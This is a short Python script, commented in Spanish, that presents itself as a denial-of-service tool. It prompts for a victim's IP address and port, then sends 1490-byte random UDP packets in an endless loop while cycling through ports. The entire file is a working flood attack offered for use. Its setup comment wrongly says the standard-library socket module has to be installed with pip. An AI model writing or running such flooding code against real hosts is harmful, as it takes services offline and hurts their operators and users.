# Esta aplicacion para denegar servicios se utilizo el lenguaje python y la libreria socket
# Primero se instala socket con el siguiente comando "pip install socket"
import socket
import random

# Se solicita la informacion de la victima para ejecutar el ataque y esto se guarda en variables
ip_victima = input("Por favor, indique la IP de la victima: ")
puerto_victima = int(input("Por favor, Ingrese el puerto victima: "))

socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dato_aleatorios = random._urandom(1490)

# Se crea el while que ejecutara el envio de paquetes automaticamente
# Usando sendto para enviar los paquetes y al final del envio imprimiendo en patalla la cantidad de paquetes y el puerto
paquetes_enviados = 0
while True:
    socket_udp.sendto(dato_aleatorios, (ip_victima, puerto_victima))
    paquetes_enviados += 1
    puerto_victima += 1
    print(f"Enviados {paquetes_enviados} paquetes a {ip_victima} a través del puerto: {puerto_victima}")
    if puerto_victima == 65534:
        puerto_victima = 1









